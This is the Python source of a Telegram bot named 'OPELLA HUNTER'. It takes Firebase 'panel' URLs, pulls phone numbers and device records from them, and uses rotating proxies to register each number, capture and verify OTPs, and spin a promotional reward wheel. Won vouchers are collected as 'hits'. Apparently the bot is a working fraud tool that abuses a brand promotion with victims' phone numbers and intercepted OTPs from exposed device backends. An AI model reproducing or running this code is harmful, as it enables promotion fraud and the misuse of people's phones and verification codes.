LOG_SINKS: Dict[int, Any] = {}
EDIT_INTERVAL = 0.35
FORCE_EDIT_AFTER = 0.6
RENDER_LOCKS: Dict[int, asyncio.Lock] = {}

def get_render_lock(chat_id):
    lk = RENDER_LOCKS.get(chat_id)
    if lk is None:
        lk = asyncio.Lock(); RENDER_LOCKS[chat_id] = lk
    return lk

def make_sink(chat_id):
    def sink(msg, cls):
        try: asyncio.run_coroutine_threadsafe(_handle_log(chat_id, msg, cls), BOT_LOOP)
        except: pass
    return sink

# ════════════════════════════════════════════════════════════
#  LOG SYSTEM
# ════════════════════════════════════════════════════════════
def push_log(msg, cls="info"):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)
    owner = _current_chat.get()
    if owner is not None:
        sink = LOG_SINKS.get(owner)
        if sink:
            try: sink(msg, cls)
            except: pass
        return
    for sink in list(LOG_SINKS.values()):
        try: sink(msg, cls)
        except: pass

# ════════════════════════════════════════════════════════════
#  RENDER
# ════════════════════════════════════════════════════════════
LINE = "─" * 50

def _bar(done, total, width=10):
    if total <= 0: return C["bar_empty"] * width
    filled = max(0, min(width, int(width * done / total)))
    return C["bar_full"] * filled + C["bar_empty"] * (width - filled)

def _col_otp(b):
    if b.get("otp_recv"): return f"{C['otp_recv']} recv"
    if b["otp_sent"]: return f"{C['otp_sent']} sent"
    return f"{C['waiting']} wait"

def _col_verify(b):
    if b["verified"]: return f"{C['verified']} verified"
    if b["timeout"]: return f"{C['timeout']} timeout"
    if b["otp_sent"]: return f"{C['waiting']} waiting"
    return "·"

def _col_spin(b):
    if b["result"] == "WIN":
        rew = b["reward"] or ""; amt = b["amount"] or ""
        return f"{C['win']} WIN {rew} ₹{amt}".strip()
    if b["result"] == "LOSE":
        rew = b["reward"] or ""
        return f"{C['lose']} better luck {rew}".strip()
    if b["result"] == "ALREADY": return f"{C['already']} already"
    if b["timeout"]: return f"{C['failed']} failed"
    if b["verified"]: return f"{C['spinning']} spinning"
    return f"{C['pending']} pending"

def _panel_header(idx, url, total, done=0):
    short = url.replace("https://", "").replace("http://", "").rstrip("/")
    if len(short) > 38: short = short[:35] + "..."
    bar = _bar(done, max(1, total))
    return (f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  {C['panel']} PANEL {idx} / {total}    {bar}\n"
            f"┃  {esc(short)}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n")

def _build_top_header(st):
    cur = st["current_panel"]; tot = len(st["panels"]) or 1
    pct = int(100 * cur / tot) if tot else 0
    bar = _bar(cur, tot)
    return (f"╔══════════════════════════════════════════════════╗\n"
            f"║   {C['panel']} OPELLA HUNTER  ·  by {CREDIT}                 ║\n"
            f"╚══════════════════════════════════════════════════╝\n"
            f"\n"
            f"{C['arrow']} Overall  {cur}/{tot}   {bar}  {pct}%\n"
            f"{C['arrow']} {C['win']} Wins {st['wins']}   "
            f"{C['lose']} Losses {st['losses']}   "
            f"{C['hit']} Hits {len(st['hits'])}\n"
            f"{C['arrow']} {C['otp_sent']} OTP {st['otp_sent']}   "
            f"{C['verified']} Verified {st['otp_verified']}   "
            f"{C['done']} Processed {st['processed']}\n"
            f"{LINE}\n")

def render_table_row(idx, block):
    return f"  {idx:>2}  {block['phone']:<12}  {_col_otp(block):<10} {_col_verify(block):<12} {_col_spin(block)}"

async def _render_and_send(chat_id, force=False):
    lock = get_render_lock(chat_id)
    async with lock:
        st = get_state(chat_id)
        now = time.time(); since = now - st["last_edit"]
        if not force and since < EDIT_INTERVAL: return
        if force and since < FORCE_EDIT_AFTER: return
        st["last_edit"] = now
        top = _build_top_header(st)
        sections = []
        panel_order = list(range(1, len(st["panels"]) + 1))
        for pidx in panel_order:
            pn = st.get("panel_numbers", {}).get(pidx)
            if not pn: continue
            url = st["panels"][pidx - 1] if pidx - 1 < len(st["panels"]) else ""
            ps = st.get("panel_stats", {}).get(pidx, {})
            items = sorted(pn.values(), key=lambda b: b["ts"])
            rows = [render_table_row(i, blk) for i, blk in enumerate(items, 1)]
            body = (f"  #   NUMBER        OTP        VERIFY       SPIN\n"
                    f"  {'─'*46}\n" + ("\n".join(rows) if rows else "  · waiting…"))
            sections.append(_panel_header(pidx, url, len(st["panels"]), ps.get("total", 0)) + body)
        if not sections: sections.append("  · waiting for devices…")
        full = top + "\n\n".join(sections)
        html = f"<pre>{esc(full)}</pre>"
        if len(html) > 4000: html = f"<pre>{esc(top)}</pre>"

        if st["log_msg_id"]:
            try:
                await asyncio.wait_for(
                    BOT_APP.bot.edit_message_text(chat_id=chat_id, message_id=st["log_msg_id"],
                                                  text=html, parse_mode="HTML"), timeout=4.0)
            except BadRequest as e:
                emsg = str(e).lower()
                if "not modified" in emsg: pass
                elif "message to edit not found" in emsg or "message can't be edited" in emsg:
                    st["log_msg_id"] = None
            except asyncio.TimeoutError: pass
            except Exception as e: print(f"render err: {e}")
            return

        try:
            m = await asyncio.wait_for(
                BOT_APP.bot.send_message(chat_id=chat_id, text=html, parse_mode="HTML"), timeout=4.0)
            st["log_msg_id"] = m.message_id
        except Exception as e: print(f"render send err: {e}")

def _kick_render(chat_id, force=False):
    try: asyncio.create_task(_render_and_send(chat_id, force=force))
    except: pass

async def _handle_log(chat_id, msg, cls):
    st = get_state(chat_id)
    m = msg.strip()
    if not m: return
    if re.search(r"→\s*\d+\s*user=", m): return
    if "spin_raw" in m: return
    cur_pidx = st["current_panel"] or 1
    mo = re.search(r"(\d{10})[^\d]{0,20}registered", m, re.I)
    if mo:
        blk = ensure_number(st, cur_pidx, mo.group(1)); blk["otp_sent"] = True
        st["otp_sent"] += 1; _kick_render(chat_id); return
    mo = re.search(r"(\d{10})[^\d]{0,20}OTP=(\d{6})", m)
    if mo:
        blk = ensure_number(st, cur_pidx, mo.group(1)); blk["otp_recv"] = True
        st["otp_verified"] += 1; _kick_render(chat_id); return
    mo = re.search(r"(\d{10})[^\d]{0,20}verified", m, re.I)
    if mo:
        blk = ensure_number(st, cur_pidx, mo.group(1)); blk["verified"] = True
        _kick_render(chat_id, force=True); return
    mo = re.search(r"(\d{10})[^\d]{0,20}OTP timeout", m, re.I)
    if mo:
        blk = ensure_number(st, cur_pidx, mo.group(1)); blk["timeout"] = True
        st["errors"] += 1; _kick_render(chat_id, force=True); return
    mo = re.search(r"WIN\s+(\d{10}).*reward=(\w+).*amt=(\d+)", m, re.I)
    if mo:
        phone, rew, amt = mo.group(1), mo.group(2), mo.group(3)
        blk = ensure_number(st, cur_pidx, phone)
        blk["result"] = "WIN"; blk["reward"] = rew; blk["amount"] = amt
        st["wins"] += 1
        st["panel_stats"].setdefault(cur_pidx, {"wins":0,"loss":0,"total":0})
        st["panel_stats"][cur_pidx]["wins"] += 1
        _kick_render(chat_id, force=True); return
    mo = re.search(r"(\d{10})\s+lose\s+reward=(\w+)", m, re.I)
    if mo:
        phone, rew = mo.group(1), mo.group(2)
        blk = ensure_number(st, cur_pidx, phone); blk["result"] = "LOSE"; blk["reward"] = rew
        st["losses"] += 1
        st["panel_stats"].setdefault(cur_pidx, {"wins":0,"loss":0,"total":0})
        st["panel_stats"][cur_pidx]["loss"] += 1
        _kick_render(chat_id, force=True); return
    mo = re.search(r"(\d{10})[^\d]{0,20}already\s+spun", m, re.I)
    if mo:
        blk = ensure_number(st, cur_pidx, mo.group(1)); blk["result"] = "ALREADY"
        st["already_spun"] += 1; _kick_render(chat_id); return
    mo = re.search(r"(\d+)\s+device", m, re.I)
    if mo and "found" in m.lower():
        st["devices_total"] += int(mo.group(1)); _kick_render(chat_id, force=True); return
    mo = re.search(r"panel\s+(\d+)/(\d+)\s+start", m, re.I)
    if mo:
        st["current_panel"] = int(mo.group(1)); _kick_render(chat_id, force=True); return
    if re.search(r"err|exception", m, re.I):
        st["errors"] += 1; _kick_render(chat_id); return

# ════════════════════════════════════════════════════════════
#  PANEL RUNNER
# ════════════════════════════════════════════════════════════
async def run_panel_async(user_id, chat_id, fb_url, panel_idx, total_panels):
    st = get_state(chat_id)
    tag = f"P{panel_idx}"
    token = _current_chat.set(chat_id)
    try:
        push_log(f"panel {panel_idx}/{total_panels} start", "info")
        proxies = load_proxies(user_id)
        st_pairs = []
        try:
            probe = OpellaClient(proxy=random.choice(proxies)["url"] if proxies else None, proxy_pool=proxies)
            probe.create_user()
            st_pairs = extract_state_city_pairs(probe.get_state_cities())
            try: probe.s.close()
            except: pass
        except Exception as e:
            push_log(f"probe failed: {e}", "warn")
        if not st_pairs: st_pairs = [("Karnataka","Bangalore")]
        try:
            devices = await asyncio.to_thread(fetch_devices_for_panel, fb_url)
        except Exception as e:
            push_log(f"panel fetch err: {e}", "err"); return
        if not devices:
            push_log("no devices", "warn"); return
        for d in devices: ensure_number(st, panel_idx, d["phone"])
        st["devices_total"] += len(devices)
        st["panel_stats"].setdefault(panel_idx, {"wins":0,"loss":0,"total":len(devices)})
        st["panel_stats"][panel_idx]["total"] = len(devices)
        push_log(f"{len(devices)} devices found", "ok")
        await _render_and_send(chat_id, force=True)
        sem = asyncio.Semaphore(MAX_WORKERS)
        proxy_cycle = itertools.cycle(proxies) if proxies else None
        async def _one(d):
            if st["stop_event"].is_set(): return
            async with sem:
                if st["stop_event"].is_set(): return
                proxy = next(proxy_cycle)["url"] if proxy_cycle else None
                try:
                    await asyncio.to_thread(flow_for_phone, user_id, d["phone"], d["client_id"], d["firebase_url"],
                                            proxy, tag, st_pairs, proxies)
                    st["processed"] += 1
                except Exception as e:
                    push_log(f"[{tag}] {d['phone']} err: {e}", "err")
        tasks = []
        for d in devices:
            if st["stop_event"].is_set(): break
            tasks.append(asyncio.create_task(_one(d)))
            await asyncio.sleep(random.uniform(0.05, 0.15))
        if tasks: await asyncio.gather(*tasks, return_exceptions=True)
        push_log(f"Panel {panel_idx} DONE", "ok")
    finally:
        _current_chat.reset(token)

# ════════════════════════════════════════════════════════════
#  TELEGRAM KEYBOARDS
# ════════════════════════════════════════════════════════════
def main_menu_kb(user_id=None):
    buttons = [
        [InlineKeyboardButton("▶ Run", callback_data="run"),
         InlineKeyboardButton("■ Stop", callback_data="stop")],
        [InlineKeyboardButton("ℹ Status", callback_data="status"),
         InlineKeyboardButton("🏆 Hits", callback_data="hits")],
        [InlineKeyboardButton("▤ Panels", callback_data="panels"),
         InlineKeyboardButton("🗑 Clear", callback_data="clear")],
    ]
    # Add all force-join channels (2 per row)
    ch_row = []
    for ch in FORCE_CHANNELS:
        ch_row.append(InlineKeyboardButton(f"{C['join']} {ch['username']}", url=ch["url"]))
        if len(ch_row) == 2:
            buttons.append(ch_row); ch_row = []
    if ch_row: buttons.append(ch_row)
    if user_id and is_admin(user_id):
        buttons.insert(0, [InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(buttons)

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 Export All Data", callback_data="admin_export")],
        [InlineKeyboardButton("👥 List Users", callback_data="admin_users")],
        [InlineKeyboardButton("➕ Add Admin", callback_data="admin_add")],
        [InlineKeyboardButton("➖ Remove Admin", callback_data="admin_remove")],
        [InlineKeyboardButton("📋 List Admins", callback_data="admin_list")],
        [InlineKeyboardButton("🔙 Back", callback_data="admin_back")],
    ])

async def _safe_reply(update, text, **kwargs):
    msg = update.effective_message
    if msg is None:
        chat = update.effective_chat
        if chat is None: return
        await BOT_APP.bot.send_message(chat.id, text, **kwargs); return
    await msg.reply_text(text, **kwargs)

# ════════════════════════════════════════════════════════════
#  USER COMMANDS
# ════════════════════════════════════════════════════════════
async def cmd_start(update, ctx):
    if not await require_join(update, ctx): return
    user_id = update.effective_user.id
    admin_btn = ""
    if is_admin(user_id):
        admin_btn = f"\n👑 Admin access granted."
    await _safe_reply(update,
        f"{C['panel']} {BOT_NAME}  ·  by {CREDIT}\n{LINE}\n"
        f"Send panel URL(s) — one per line:\n"
        f"  <code>https://xxx.firebaseio.com</code>\n\n{LINE}\n"
        f"Use the buttons below to control.{admin_btn}",
        parse_mode="HTML", reply_markup=main_menu_kb(user_id))

async def cmd_panel(update, ctx):
    if not await require_join(update, ctx): return
    msg = update.effective_message
    if msg is None or msg.text is None:
        await _safe_reply(update, f"{C['error']} no text."); return
    chat = update.effective_chat
    if chat is None: return
    st = get_state(chat.id)
    urls = re.findall(r"https?://[^\s]+", msg.text or "")
    if not urls:
        await _safe_reply(update, f"{C['error']} no URL."); return
    added, dup = 0, 0
    for u in urls:
        parsed = parse_panel_link(u)
        if not parsed: continue
        if parsed in st["panels"]: dup += 1; continue
        st["panels"].append(parsed); added += 1
    if added:
        save_json(user_paths(update.effective_user.id)["panels"], {"panels": st["panels"]})
    if added:
        await _safe_reply(update,
            f"{C['done']} added {added}  ·  total {len(st['panels'])}",
            reply_markup=main_menu_kb(update.effective_user.id))
    elif dup:
        await _safe_reply(update,
            f"{C['already']} already exists  ·  total {len(st['panels'])}",
            reply_markup=main_menu_kb(update.effective_user.id))

async def cmd_run(update, ctx, chat_id=None):
    if not await require_join(update, ctx): return
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    user_id = update.effective_user.id
    st = get_state(chat_id)
    if st["running"]:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} already running."); return
    if not st["panels"]:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} add panel first."); return
    if st.get("log_msg_id"):
        try: await BOT_APP.bot.delete_message(chat_id, st["log_msg_id"])
        except: pass
        st["log_msg_id"] = None
    st.update({"running": True, "current_panel": 0, "devices_total": 0, "processed": 0,
               "wins": 0, "losses": 0, "already_spun": 0, "otp_sent": 0, "otp_verified": 0,
               "errors": 0, "panel_stats": {}, "hits": [], "panel_numbers": {},
               "numbers": {}, "num_order": [], "last_edit": 0, "started_at": time.time()})
    st["stop_event"] = threading.Event()
    LOG_SINKS[chat_id] = make_sink(chat_id)
    STOP_EVENT.clear()
    await _render_and_send(chat_id, force=True)
    await BOT_APP.bot.send_message(chat_id,
        f"{C['panel']} starting  ·  {len(st['panels'])} panel(s)\n"
        f"{LINE} by {CREDIT}",
        parse_mode="HTML", reply_markup=main_menu_kb(user_id))
    async def _runner():
        try:
            for i, url in enumerate(st["panels"], 1):
                if st["stop_event"].is_set(): break
                st["current_panel"] = i
                try: await run_panel_async(user_id, chat_id, url, i, len(st["panels"]))
                except Exception as e: push_log(f"Panel {i} err: {e}", "err")
                await asyncio.sleep(PANEL_GAP)
        finally:
            st["running"] = False
            try: await send_final(chat_id, user_id)
            except Exception as e: print(f"final err: {e}")
    asyncio.create_task(_runner())

async def send_final(chat_id, user_id):
    st = get_state(chat_id)
    lines = [f"{C['done']} FINAL  ·  by {CREDIT}", LINE,
             f"panels     ▸ {len(st['panels'])}",
             f"processed  ▸ {st['processed']}",
             f"{C['win']} win     ▸ {st['wins']}",
             f"{C['lose']} better luck ▸ {st['losses']}",
             f"{C['already']} already ▸ {st['already_spun']}",
             f"{C['hit']} hits    ▸ {len(st['hits'])}", LINE]
    for idx, s in sorted(st["panel_stats"].items()):
        lines.append(f"panel {idx}:  W{s['wins']}  L{s['loss']}  T{s['total']}")
    if st["hits"]:
        lines += ["", f"{C['hit']} HITS  ·  by {CREDIT}", LINE]
        for i, h in enumerate(st["hits"], 1):
            lines.append(f"#{i}  code    ▸ <code>{esc(h['voucher'])}</code>\n"
                         f"     phone   ▸ {esc(h['phone'])}\n"
                         f"     device  ▸ {esc(h['device'][:12])}\n"
                         f"     panel   ▸ {esc(h['panel'])}")
    try: await BOT_APP.bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")
    except Exception as e: print(f"final err: {e}")

async def cmd_stop(update, ctx, chat_id=None):
    if not await require_join(update, ctx): return
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    st = get_state(chat_id)
    st["stop_event"].set()
    STOP_EVENT.set()
    await BOT_APP.bot.send_message(chat_id, f"{C['already']} stopping  ·  by {CREDIT}")

async def cmd_status(update, ctx, chat_id=None):
    if not await require_join(update, ctx): return
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    st = get_state(chat_id)
    await BOT_APP.bot.send_message(chat_id, f"<pre>{esc(_build_top_header(st))}</pre>", parse_mode="HTML")

async def cmd_hits(update, ctx, chat_id=None):
    if not await require_join(update, ctx): return
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    user_id = update.effective_user.id
    st = get_state(chat_id)
    up = user_paths(user_id)
    hits_from_file = []
    if up["vouchers"].exists():
        try:
            with open(up["vouchers"]) as f:
                hits_from_file = f.read().strip().split("\n")
        except: pass
    if not st["hits"] and not hits_from_file:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} no hits  ·  by {CREDIT}"); return
    lines = [f"{C['hit']} HITS  ·  by {CREDIT}", LINE, ""]
    if hits_from_file:
        for line in hits_from_file[-50:]:
            lines.append(f"  {line}")
    elif st["hits"]:
        for i, h in enumerate(st["hits"], 1):
            lines.append(f"#{i}  code    ▸ <code>{esc(h['voucher'])}</code>\n"
                         f"     phone   ▸ {esc(h['phone'])}\n"
                         f"     device  ▸ {esc(h['device'][:16])}\n"
                         f"     panel   ▸ {esc(h['panel'])}\n")
    txt = "\n".join(lines)
    for ch in [txt[i:i+4000] for i in range(0, len(txt), 4000)]:
        try: await BOT_APP.bot.send_message(chat_id, ch, parse_mode="HTML")
        except Exception as e: print(f"hits send err: {e}")

async def cmd_panels(update, ctx, chat_id=None):
    if not await require_join(update, ctx): return
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    st = get_state(chat_id)
    if not st["panels"]:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} no panels  ·  by {CREDIT}"); return
    lines = [f"panels ({len(st['panels'])})  ·  by {CREDIT}", LINE, ""]
    for i, u in enumerate(st["panels"], 1):
        lines.append(f"{i}. <code>{esc(u)}</code>")
    await BOT_APP.bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")

async def cmd_clear(update, ctx, chat_id=None):
    if not await require_join(update, ctx): return
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    st = get_state(chat_id)
    st["panels"] = []
    save_json(user_paths(update.effective_user.id)["panels"], {"panels": []})
    await BOT_APP.bot.send_message(chat_id, f"{C['done']} cleared  ·  by {CREDIT}")

async def cmd_clearpanels(update, ctx):
    await cmd_clear(update, ctx)

async def cmd_vouchers(update, ctx):
    await cmd_hits(update, ctx)

async def cmd_mydir(update, ctx):
    if not await require_join(update, ctx): return
    await update.effective_message.reply_text(
        f"📁 <b>Your Data</b>\n{LINE}\n"
        f"Use /hits to view your vouchers.",
        parse_mode="HTML")

async def cmd_verify(update, ctx):
    user = update.effective_user
    missing = await missing_channels(user.id)
    if not missing:
        await update.effective_message.reply_text(
            f"{C['check']} Verified! You can use the bot now.\nSend /start to begin.",
            reply_markup=main_menu_kb(user.id))
    else:
        ch_list = "\n".join(f"  {i}. {c['username']}" for i, c in enumerate(missing, 1))
        await update.effective_message.reply_text(
            f"{C['cross']} You haven't joined all channels yet.\n\n"
            f"Still missing ({len(missing)}):\n{ch_list}\n\n"
            f"Join them and tap Verify again.",
            reply_markup=join_kb(missing))

# ════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ════════════════════════════════════════════════════════════
async def cmd_admin(update, ctx):
    user = update.effective_user
    if not is_admin(user.id):
        await _safe_reply(update, f"{C['cross']} You are not an admin.")
        return
    await _safe_reply(update,
        f"👑 <b>Admin Panel</b>\n{LINE}\n"
        f"Owner: <code>{OWNER_ID}</code>\n"
        f"Admins: {len(ADMINS)}\n\n"
        f"Select an option below:",
        parse_mode="HTML", reply_markup=admin_kb())

async def admin_export(update, ctx, chat_id):
    user = update.effective_user
    if not is_admin(user.id):
        await BOT_APP.bot.send_message(chat_id, f"{C['cross']} Admin only."); return
    await BOT_APP.bot.send_message(chat_id, "📦 Preparing export...")
    try:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(USERS_DIR):
                for file in files:
                    fp = os.path.join(root, file)
                    arc = os.path.relpath(fp, DATA_DIR)
                    zf.write(fp, arc)
            if ADMINS_FILE.exists():
                zf.write(ADMINS_FILE, "admins.json")
            if LOGS_DIR.exists():
                for root, dirs, files in os.walk(LOGS_DIR):
                    for file in files:
                        fp = os.path.join(root, file)
                        arc = os.path.relpath(fp, DATA_DIR)
                        zf.write(fp, arc)
        buf.seek(0)
        await BOT_APP.bot.send_document(
            chat_id=chat_id,
            document=buf,
            filename=f"data_{int(time.time())}.zip",
            caption=f"📦 Export  ·  by {CREDIT}")
    except Exception as e:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} Export failed: {e}")

async def admin_list_users(update, ctx, chat_id):
    user = update.effective_user
    if not is_admin(user.id):
        await BOT_APP.bot.send_message(chat_id, f"{C['cross']} Admin only."); return
    users = []
    if USERS_DIR.exists():
        for d in sorted(USERS_DIR.iterdir()):
            if d.is_dir() and d.name.isdigit():
                users.append(d.name)
    if not users:
        await BOT_APP.bot.send_message(chat_id, "No users yet."); return
    text = f"👥 Users ({len(users)}):\n" + "\n".join(f"  ▸ <code>{u}</code>" for u in users)
    if len(text) > 4000:
        text = text[:4000] + "\n…"
    await BOT_APP.bot.send_message(chat_id, text, parse_mode="HTML")

async def admin_add(update, ctx, chat_id):
    user = update.effective_user
    if not is_admin(user.id):
        await BOT_APP.bot.send_message(chat_id, f"{C['cross']} Admin only."); return
    await BOT_APP.bot.send_message(chat_id,
        "Send the <b>user ID</b> you want to add as admin.\n"
        "Example: <code>123456789</code>",
        parse_mode="HTML")
    ctx.user_data["awaiting_admin_add"] = True

async def admin_remove(update, ctx, chat_id):
    user = update.effective_user
    if not is_admin(user.id):
        await BOT_APP.bot.send_message(chat_id, f"{C['cross']} Admin only."); return
    await BOT_APP.bot.send_message(chat_id,
        "Send the <b>user ID</b> you want to remove from admins.\n"
        "Example: <code>123456789</code>",
        parse_mode="HTML")
    ctx.user_data["awaiting_admin_remove"] = True

async def admin_list(update, ctx, chat_id):
    user = update.effective_user
    if not is_admin(user.id):
        await BOT_APP.bot.send_message(chat_id, f"{C['cross']} Admin only."); return
    lines = [f"👑 Admins ({len(ADMINS)}):", LINE]
    for a in sorted(ADMINS):
        tag = " (owner)" if a == OWNER_ID else ""
        lines.append(f"  ▸ <code>{a}</code>{tag}")
    await BOT_APP.bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")

async def handle_admin_text(update, ctx):
    user = update.effective_user
    if not is_admin(user.id): return False
    msg = update.effective_message
    if msg is None or msg.text is None: return False
    chat = update.effective_chat
    if chat is None: return False

    text = msg.text.strip()
    if ctx.user_data.get("awaiting_admin_add"):
        ctx.user_data["awaiting_admin_add"] = False
        if not text.isdigit():
            await msg.reply_text(f"{C['error']} Invalid ID. Send numeric user ID.")
            return True
        new_id = int(text)
        if new_id in ADMINS:
            await msg.reply_text(f"{C['already']} Already an admin.")
            return True
        ADMINS.add(new_id)
        save_admins(ADMINS)
        await msg.reply_text(f"{C['done']} Admin added: <code>{new_id}</code>", parse_mode="HTML")
        return True

    if ctx.user_data.get("awaiting_admin_remove"):
        ctx.user_data["awaiting_admin_remove"] = False
        if not text.isdigit():
            await msg.reply_text(f"{C['error']} Invalid ID. Send numeric user ID.")
            return True
        rm_id = int(text)
        if rm_id == OWNER_ID:
            await msg.reply_text(f"{C['cross']} Cannot remove owner.")
            return True
        if rm_id not in ADMINS:
            await msg.reply_text(f"{C['cross']} Not an admin.")
            return True
        ADMINS.discard(rm_id)
        save_admins(ADMINS)
        await msg.reply_text(f"{C['done']} Admin removed: <code>{rm_id}</code>", parse_mode="HTML")
        return True

    return False

async def on_callback(update, ctx):
    q = update.callback_query
    if q is None: return
    try: await q.answer()
    except BadRequest as e: print(f"answer skipped: {e}")
    except Exception as e: print(f"answer err: {e}")
    chat_id = q.message.chat.id if q.message else None
    if chat_id is None: return
    d = q.data
    user_id = q.from_user.id if q.from_user else None

    if d == "verify_join":
        await cmd_verify(update, ctx); return

    if d.startswith("admin_"):
        if not user_id or not is_admin(user_id):
            await BOT_APP.bot.send_message(chat_id, f"{C['cross']} Admin only."); return
        if d == "admin_panel":
            await BOT_APP.bot.send_message(chat_id,
                f"👑 <b>Admin Panel</b>\n{LINE}\n"
                f"Owner: <code>{OWNER_ID}</code>\n"
                f"Admins: {len(ADMINS)}",
                parse_mode="HTML", reply_markup=admin_kb())
        elif d == "admin_export":
            await admin_export(update, ctx, chat_id)
        elif d == "admin_users":
            await admin_list_users(update, ctx, chat_id)
        elif d == "admin_add":
            await admin_add(update, ctx, chat_id)
        elif d == "admin_remove":
            await admin_remove(update, ctx, chat_id)
        elif d == "admin_list":
            await admin_list(update, ctx, chat_id)
        elif d == "admin_back":
            await BOT_APP.bot.send_message(chat_id,
                f"{C['panel']} {BOT_NAME}  ·  by {CREDIT}",
                reply_markup=main_menu_kb(user_id))
        return

    if d == "run":    await cmd_run(update, ctx, chat_id)
    elif d == "stop":   await cmd_stop(update, ctx, chat_id)
    elif d == "status": await cmd_status(update, ctx, chat_id)
    elif d == "hits":   await cmd_hits(update, ctx, chat_id)
    elif d == "panels": await cmd_panels(update, ctx, chat_id)
    elif d == "clear":  await cmd_clear(update, ctx, chat_id)

async def handle_text(update, ctx):
    if not await require_join(update, ctx): return
    msg = update.effective_message
    if msg is None or msg.text is None: return
    chat = update.effective_chat
    if chat is None: return

    if await handle_admin_text(update, ctx):
        return

    urls = re.findall(r"https?://[^\s]+", msg.text.strip())
    if not urls: return
    st = get_state(chat.id)
    added, dup = 0, 0
    for u in urls:
        parsed = parse_panel_link(u)
        if not parsed: continue
        if parsed in st["panels"]: dup += 1; continue
        st["panels"].append(parsed); added += 1
    if added:
        save_json(user_paths(update.effective_user.id)["panels"], {"panels": st["panels"]})
    if added:
        await msg.reply_text(
            f"{C['done']} added {added}  ·  total {len(st['panels'])}",
            reply_markup=main_menu_kb(update.effective_user.id))

async def error_handler(update, ctx):
    print(f"update error: {ctx.error}")

async def post_init(app):
    await app.bot.set_my_commands([
        BotCommand("start","Menu"), BotCommand("panel","Add panel(s)"),
        BotCommand("panels","List panels"), BotCommand("run","Start"),
        BotCommand("stop","Stop"), BotCommand("status","Stats"),
        BotCommand("hits","Hits"), BotCommand("vouchers","Vouchers"),
        BotCommand("mydir","My folder"), BotCommand("verify","Verify join"),
        BotCommand("admin","Admin panel"), BotCommand("clearpanels","Clear"),
    ])

def main():
    global BOT_APP, BOT_LOOP
    BOT_APP = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    BOT_LOOP = asyncio.new_event_loop()
    asyncio.set_event_loop(BOT_LOOP)
    BOT_APP.add_handler(CommandHandler("start", cmd_start))
    BOT_APP.add_handler(CommandHandler("panel", cmd_panel))
    BOT_APP.add_handler(CommandHandler("panels", cmd_panels))
    BOT_APP.add_handler(CommandHandler("clearpanels", cmd_clearpanels))
    BOT_APP.add_handler(CommandHandler("run", cmd_run))
    BOT_APP.add_handler(CommandHandler("stop", cmd_stop))
    BOT_APP.add_handler(CommandHandler("status", cmd_status))
    BOT_APP.add_handler(CommandHandler("hits", cmd_hits))
    BOT_APP.add_handler(CommandHandler("vouchers", cmd_vouchers))
    BOT_APP.add_handler(CommandHandler("mydir", cmd_mydir))
    BOT_APP.add_handler(CommandHandler("verify", cmd_verify))
    BOT_APP.add_handler(CommandHandler("admin", cmd_admin))
    BOT_APP.add_handler(CallbackQueryHandler(on_callback))
    BOT_APP.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    BOT_APP.add_error_handler(error_handler)
    print(f"{BOT_NAME} running | credit: {CREDIT}")
    BOT_APP.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
